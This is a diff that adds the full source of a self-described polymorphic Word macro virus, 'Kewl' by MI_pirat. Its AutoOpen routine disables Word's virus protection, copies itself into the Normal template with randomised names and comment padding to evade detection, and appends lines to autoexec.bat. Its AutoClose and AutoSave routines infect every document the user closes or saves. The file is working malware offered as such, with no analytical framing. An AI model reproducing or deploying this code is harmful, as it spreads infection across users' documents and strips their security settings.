@@ -1,0 +1,70 @@
+Sub AutoOpen()
+'PolyMorphing Viruz by MI_pirat
+'CodeNAME: Kewl--NOT!
+On Error Resume Next
+StatusBar = "<< Kewl lives somewhere in HERE >>"
+If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Kewl") <> "Kaka" Then
+System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Kewl") = "Kaka"
+Options.VirusProtection = (2 Xor 2)
+Dim nr, xxx, nume
+nume = Chr(Int((100 * Rnd) + 32)) + Chr(Int((100 * Rnd) + 32)) + Chr(Int((100 * Rnd) + 32))
+ActiveDocument.VBProject.VBComponents(2).Name = nume
+nr = ActiveDocument.VBProject.VBComponents.Item(2).CodeModule.CountOfLines
+Set myTemplate = NormalTemplate
+Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=myTemplate.FullName, Name:=nume, Object:=wdOrganizerObjectProjectItems
+For i = 1 To nr
+xxx = ActiveDocument.VBProject.VBComponents(2).CodeModule.Lines(i, 1)
+poly = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
+strn = xxx + " '" + poly
+NormalTemplate.VBProject.VBComponents.Item(2).CodeModule.ReplaceLine i, strn
+Next i
+Documents.Open FileName:=NormalTemplate.FullName, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate:="", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="", Format:=wdOpenFormatAuto
+ActiveDocument.Save
+ActiveDocument.Close
+'Some publicity doesn't hurt anyone
+Open "C:\autoexec.bat" For Append As #1
+Print #1, "@echo off"
+Print #1, "echo MI_pirat"
+Print #1, "echo Kewl LiVeS SoMeWhErE In YoUr SyStEm ---- ENDjoy"
+Print #1, "echo."
+Close #1
+End If
+End Sub
+Sub AutoClose()
+'Errr.. spead me
+On Error Resume Next
+System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") + 1
+If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") >= 10 Then MsgBox "Are U havn' phun ?", vbYesNo, "Kewl has spead considerably !"
+Dim nume, myTemplate
+myTemplate = NormalTemplate
+nume = NormalTemplate.VBProject.VBComponents(2).Name
+For Each aVar In ActiveDocument.Variables
+    If aVar.Name = "Inf" Then num = aVar.Index
+Next aVar
+If (num = 0) And (ActiveDocument.FullName <> myTemplate.FullName) Then
+ActiveDocument.Variables.Add Name:="Inf"
+ActiveDocument.Variables("Inf").Value = 1
+Set myTemplate = ActiveDocument.AttachedTemplate
+Application.OrganizerCopy Source:=myTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=nume, Object:=wdOrganizerObjectProjectItems
+ActiveDocument.Save
+End If
+End Sub
+Sub AutoSave()
+'Sure...Hehe infect it everytime
+System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") + 1
+If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") >= 10 Then MsgBox "Are U havn' phun ?", vbYesNo, "Kewl has spead considerably !"
+On Error Resume Next
+Dim nume, myTemplate
+myTemplate = NormalTemplate
+nume = NormalTemplate.VBProject.VBComponents(2).Name
+For Each aVar In ActiveDocument.Variables
+    If aVar.Name = "Inf" Then num = aVar.Index
+Next aVar
+If (num = 0) And (ActiveDocument.FullName <> myTemplate.FullName) Then
+ActiveDocument.Variables.Add Name:="Inf"
+ActiveDocument.Variables("Inf").Value = 1
+Set myTemplate = ActiveDocument.AttachedTemplate
+Application.OrganizerCopy Source:=myTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=nume, Object:=wdOrganizerObjectProjectItems
+ActiveDocument.Save
+End If
+End Sub
